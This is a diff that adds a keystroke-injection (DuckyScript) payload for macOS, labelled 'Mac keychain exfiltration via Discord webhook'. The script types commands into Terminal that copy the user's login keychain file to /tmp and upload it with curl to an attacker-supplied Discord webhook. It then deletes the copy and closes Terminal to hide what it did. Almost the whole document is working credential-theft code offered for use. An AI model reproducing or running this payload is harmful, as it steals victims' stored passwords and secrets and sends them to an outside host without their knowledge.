@@ -1,0 +1,46 @@
+REM MAC KEYCHAIN EXFILTRATION VIA DISCORD WEBHOOK
+REM CREATED BY ECTO-1A
+
+REM This script assumes that you have the "curl" command installed on your Mac. 
+REM You will need to replace <webhook URL> with the URL of the Discord webhook you want to use.
+REM Discord max webook file size is 8mb so this will only work with smaller files
+
+
+REM This script will open the terminal, navigate to the directory where the keychain file is stored, 
+REM copy the file to the tmp directory, use curl to send the file to the Discord webhook, 
+REM delete the copy of the file from the tmp directory, and then close the terminal.
+
+
+
+DELAY 1000
+GUI SPACE
+DELAY 200
+STRING terminal
+DELAY 200
+ENTER
+DELAY 800
+
+REM Get LOGIN KEYCHAIN file from Mac
+
+STRING cd ~/Library/Keychains
+ENTER
+DELAY 500
+STRING cp login.keychain-db /tmp
+ENTER
+DELAY 500
+
+REM Use curl to send login keychain file to Discord webhook
+
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/login.keychain-db" <webhook URL>
+ENTER
+DELAY 500
+
+REM Clean up
+
+STRING rm /tmp/login.keychain-db
+ENTER
+DELAY 500
+
+REM Close terminal
+
+GUI Q
